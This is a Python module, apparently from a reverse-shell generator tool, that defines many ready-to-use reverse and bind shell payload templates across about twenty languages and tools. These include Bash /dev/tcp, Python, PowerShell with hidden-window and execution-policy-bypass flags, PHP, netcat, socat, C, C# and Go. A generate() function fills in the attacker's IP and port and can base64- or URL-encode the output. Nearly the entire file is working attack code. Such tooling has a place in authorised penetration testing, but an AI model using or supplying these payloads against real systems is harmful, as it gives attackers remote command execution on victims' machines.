"""Reverse shell payload definitions."""

from base64 import b64encode
from urllib.parse import quote

SHELLS = {
    "bash": {
        "name": "Bash",
        "os": "linux",
        "variants": {
            "bash-i": {
                "name": "Bash -i",
                "cmd": '{shell} -i >& /dev/tcp/{ip}/{port} 0>&1',
            },
            "bash-196": {
                "name": "Bash 196",
                "cmd": '0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196',
            },
            "bash-udp": {
                "name": "Bash UDP",
                "cmd": '{shell} -i >& /dev/udp/{ip}/{port} 0>&1',
            },
            "bash-readline": {
                "name": "Bash read line",
                "cmd": 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
            },
            "bash-5": {
                "name": "Bash 5",
                "cmd": '{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
            },
        },
    },
    "python": {
        "name": "Python",
        "os": "all",
        "variants": {
            "python3-short": {
                "name": "Python3 shortest",
                "cmd": """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
            },
            "python3-1": {
                "name": "Python3 #1",
                "cmd": """export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'""",
            },
            "python3-2": {
                "name": "Python3 #2",
                "cmd": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'""",
            },
            "python3-win": {
                "name": "Python3 Windows",
                "cmd": """python3 -c "import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)" """,
            },
            "python2": {
                "name": "Python2",
                "cmd": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{shell}","-i"]);'""",
            },
        },
    },
    "powershell": {
        "name": "PowerShell",
        "os": "windows",
        "variants": {
            "powershell-1": {
                "name": "PowerShell #1",
                "cmd": """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
            },
            "powershell-2": {
                "name": "PowerShell #2",
                "cmd": """powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()" """,
            },
            "powershell-tls": {
                "name": "PowerShell TLS",
                "cmd": """powershell -nop -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object System.Net.Security.SslStream($NetworkStream,$false,({{$true}} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare.com',$null,'Tls12',$false);$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}}WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close()" """,
            },
        },
    },
    "php": {
        "name": "PHP",
        "os": "all",
        "variants": {
            "php-exec": {
                "name": "PHP exec",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'""",
            },
            "php-shell-exec": {
                "name": "PHP shell_exec",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");'""",
            },
            "php-popen": {
                "name": "PHP popen",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");'""",
            },
            "php-proc-open": {
                "name": "PHP proc_open",
                "cmd": """php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("{shell}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
            },
        },
    },
    "ruby": {
        "name": "Ruby",
        "os": "all",
        "variants": {
            "ruby-1": {
                "name": "Ruby #1",
                "cmd": """ruby -rsocket -e'spawn("{shell}",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'""",
            },
        },
    },
    "perl": {
        "name": "Perl",
        "os": "all",
        "variants": {
            "perl-1": {
                "name": "Perl",
                "cmd": """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");}};'""",
            },
            "perl-nosh": {
                "name": "Perl no sh",
                "cmd": """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
            },
        },
    },
    "netcat": {
        "name": "Netcat",
        "os": "linux",
        "variants": {
            "nc-e": {
                "name": "nc -e",
                "cmd": "nc {ip} {port} -e {shell}",
            },
            "nc-c": {
                "name": "nc -c",
                "cmd": "nc -c {shell} {ip} {port}",
            },
            "nc-mkfifo": {
                "name": "nc mkfifo",
                "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
            },
            "ncat": {
                "name": "ncat",
                "cmd": "ncat {ip} {port} -e {shell}",
            },
            "ncat-udp": {
                "name": "ncat UDP",
                "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
            },
            "nc-exe": {
                "name": "nc.exe (Windows)",
                "cmd": "nc.exe {ip} {port} -e cmd.exe",
            },
        },
    },
    "socat": {
        "name": "Socat",
        "os": "linux",
        "variants": {
            "socat-1": {
                "name": "Socat #1",
                "cmd": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
            },
            "socat-2": {
                "name": "Socat #2 (TTY)",
                "cmd": "socat TCP:{ip}:{port} EXEC:{shell},pty,stderr,setsid,sigint,sane",
            },
        },
    },
    "java": {
        "name": "Java",
        "os": "all",
        "variants": {
            "java-runtime": {
                "name": "Java Runtime",
                "cmd": """Runtime r = Runtime.getRuntime();
Process p = r.exec("{shell} -c 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
p.waitFor();""",
            },
            "java-1": {
                "name": "Java #1",
                "cmd": """String host="{ip}";
int port={port};
String cmd="{shell}";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();""",
            },
        },
    },
    "groovy": {
        "name": "Groovy",
        "os": "all",
        "variants": {
            "groovy-1": {
                "name": "Groovy",
                "cmd": """String host="{ip}";
int port={port};
String cmd="{shell}";
Process p=cmd.execute();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}};p.destroy();s.close();""",
            },
        },
    },
    "lua": {
        "name": "Lua",
        "os": "linux",
        "variants": {
            "lua-1": {
                "name": "Lua #1",
                "cmd": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');" """,
            },
            "lua-2": {
                "name": "Lua #2",
                "cmd": """lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
            },
        },
    },
    "nodejs": {
        "name": "Node.js",
        "os": "all",
        "variants": {
            "node-1": {
                "name": "Node.js #1",
                "cmd": "require('child_process').exec('{shell} -i >& /dev/tcp/{ip}/{port} 0>&1')",
            },
            "node-2": {
                "name": "Node.js #2",
                "cmd": """(function(){{var net = require("net"),cp = require("child_process"),sh = cp.spawn("{shell}", []);var client = new net.Socket();client.connect({port}, "{ip}", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();""",
            },
        },
    },
    # --- NEW LANGUAGES ---
    "c": {
        "name": "C",
        "os": "linux",
        "variants": {
            "c-reverse": {
                "name": "C reverse shell",
                "cmd": """#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){{
    int port = {port};
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {{"{shell}", NULL}};
    execve("{shell}", argv, NULL);
    return 0;
}}""",
            },
        },
    },
    "csharp": {
        "name": "C#",
        "os": "windows",
        "variants": {
            "csharp-tcp": {
                "name": "C# TCP Client",
                "cmd": """using System;using System.Net.Sockets;using System.Diagnostics;using System.IO;
class Rev {{
  static void Main() {{
    using(TcpClient client = new TcpClient("{ip}", {port})) {{
      using(Stream stream = client.GetStream()) {{
        using(StreamReader rdr = new StreamReader(stream)) {{
          StreamWriter wtr = new StreamWriter(stream);
          Process p = new Process();
          p.StartInfo.FileName = "cmd.exe";
          p.StartInfo.CreateNoWindow = true;
          p.StartInfo.UseShellExecute = false;
          p.StartInfo.RedirectStandardOutput = true;
          p.StartInfo.RedirectStandardInput = true;
          p.StartInfo.RedirectStandardError = true;
          p.Start();
          p.BeginOutputReadLine();
          p.BeginErrorReadLine();
          while(true) {{
            string cmd = rdr.ReadLine();
            p.StandardInput.WriteLine(cmd);
          }}
        }}
      }}
    }}
  }}
}}""",
            },
        },
    },
    "golang": {
        "name": "Golang",
        "os": "all",
        "variants": {
            "go-reverse": {
                "name": "Go reverse shell",
                "cmd": """package main

import (
    "net"
    "os/exec"
    "syscall"
)

func main() {{
    c, _ := net.Dial("tcp", "{ip}:{port}")
    cmd := exec.Command("{shell}")
    cmd.SysProcAttr = &syscall.SysProcAttr{{Setsid: true}}
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}}""",
            },
        },
    },
    "awk": {
        "name": "Awk",
        "os": "linux",
        "variants": {
            "awk-1": {
                "name": "Awk",
                "cmd": """awk 'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null""",
            },
            "awk-bash": {
                "name": "Awk + bash",
                "cmd": """awk -v RHOST={ip} -v RPORT={port} 'BEGIN {{s="/inet/tcp/0/"RHOST"/"RPORT; while(1){{do{{s|&getline c;if(c){{while((c|&getline)>0)print $0|&s;close(c)}}}}while(c!="exit");close(s)}}}}'""",
            },
        },
    },
    "telnet": {
        "name": "Telnet",
        "os": "linux",
        "variants": {
            "telnet-1": {
                "name": "Telnet",
                "cmd": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
            },
        },
    },
    "zsh": {
        "name": "Zsh",
        "os": "linux",
        "variants": {
            "zsh-1": {
                "name": "Zsh",
                "cmd": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            },
            "zsh-devtcp": {
                "name": "Zsh /dev/tcp",
                "cmd": "zsh -i >& /dev/tcp/{ip}/{port} 0>&1",
            },
        },
    },
}

# Bind shell definitions
BIND_SHELLS = {
    "bind-netcat": {
        "name": "Netcat (Bind)",
        "os": "linux",
        "variants": {
            "nc-bind-e": {
                "name": "nc -e bind",
                "cmd": "nc -lvnp {port} -e {shell}",
            },
            "nc-bind-mkfifo": {
                "name": "nc mkfifo bind",
                "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc -lvnp {port} >/tmp/f",
            },
        },
    },
    "bind-python": {
        "name": "Python (Bind)",
        "os": "all",
        "variants": {
            "python-bind": {
                "name": "Python3 bind",
                "cmd": """python3 -c 'import socket,os,pty;s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
            },
        },
    },
    "bind-socat": {
        "name": "Socat (Bind)",
        "os": "linux",
        "variants": {
            "socat-bind": {
                "name": "Socat bind",
                "cmd": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:{shell},pty,stderr,setsid,sigint,sane",
            },
        },
    },
    "bind-php": {
        "name": "PHP (Bind)",
        "os": "all",
        "variants": {
            "php-bind": {
                "name": "PHP bind",
                "cmd": """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){{if(!socket_write($cl,"$ ",2))die;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){{socket_write($cl,fread($cmd,2048),2048);}}pclose($cmd);}}'""",
            },
        },
    },
    "bind-perl": {
        "name": "Perl (Bind)",
        "os": "all",
        "variants": {
            "perl-bind": {
                "name": "Perl bind",
                "cmd": """perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){{open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("{shell} -i");}};'""",
            },
        },
    },
}

TARGET_SHELLS = [
    "/bin/sh",
    "/bin/bash",
    "/bin/zsh",
    "/bin/ash",
    "cmd.exe",
    "powershell.exe",
]

DEFAULT_SHELL = "/bin/bash"

LISTENERS = {
    "socat": "socat file:`tty`,raw,echo=0 TCP-L:{port}",
}
DEFAULT_LISTENER = "nc -lvnp {port}"
BIND_LISTENER = "nc {ip} {port}"


def generate(ip: str, port: str, lang: str, variant: str | None = None,
             encoding: str = "raw", shell: str = DEFAULT_SHELL,
             bind: bool = False) -> str:
    """Generate a reverse or bind shell command."""
    source = BIND_SHELLS if bind else SHELLS
    if lang not in source:
        raise ValueError(f"Unknown language: {lang}. Use: {', '.join(source)}")

    shell_def = source[lang]
    variants = shell_def["variants"]

    if variant is None:
        variant = next(iter(variants))
    elif variant not in variants:
        available = ", ".join(variants)
        raise ValueError(f"Unknown variant: {variant}. Use: {available}")

    cmd = variants[variant]["cmd"].format(ip=ip, port=port, shell=shell)

    if encoding == "base64":
        cmd = b64encode(cmd.encode()).decode()
    elif encoding == "url":
        cmd = quote(cmd)
    elif encoding == "double-url":
        cmd = quote(quote(cmd))

    return cmd


def get_listener(lang: str, port: str, ip: str = "", bind: bool = False) -> str:
    """Get the listener/connect command."""
    if bind:
        return BIND_LISTENER.format(ip=ip or "TARGET_IP", port=port)
    template = LISTENERS.get(lang, DEFAULT_LISTENER)
    return template.format(port=port)


def list_languages(bind: bool = False) -> list[dict]:
    """List all available languages and their variants."""
    source = BIND_SHELLS if bind else SHELLS
    result = []
    for lang_id, lang in source.items():
        variants = [{"id": v_id, "name": v["name"]} for v_id, v in lang["variants"].items()]
        result.append({
            "id": lang_id,
            "name": lang["name"],
            "os": lang.get("os", "all"),
            "variants": variants,
        })
    return result
